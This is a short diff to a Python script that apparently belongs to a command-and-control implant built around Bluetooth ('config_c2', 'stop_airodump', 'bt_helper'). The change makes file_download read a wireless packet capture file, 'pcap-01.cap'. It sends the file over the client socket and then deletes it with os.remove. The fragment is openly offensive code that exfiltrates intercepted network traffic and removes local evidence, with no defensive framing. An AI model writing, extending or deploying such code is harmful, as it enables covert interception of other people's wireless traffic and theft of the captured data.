@@ -1,6 +1,6 @@
 import subprocess
 import bt_helper
-
+import os
 
 dispatch_handlers = {
 	"config_c2" : config_c2_server,
@@ -79,7 +79,9 @@ def stop_airodump():
 def file_download(*args):
 	client_sock = bt_helper.CLIENT_SOCK
 	fileContent = ""
-	with open("text.txt","rb") as f:
+	with open("pcap-01.cap","rb") as f:
 	    fileContent = f.read()
 	client_sock.send(fileContent)
 	client_sock.close()
+
+	os.remove(f.name)
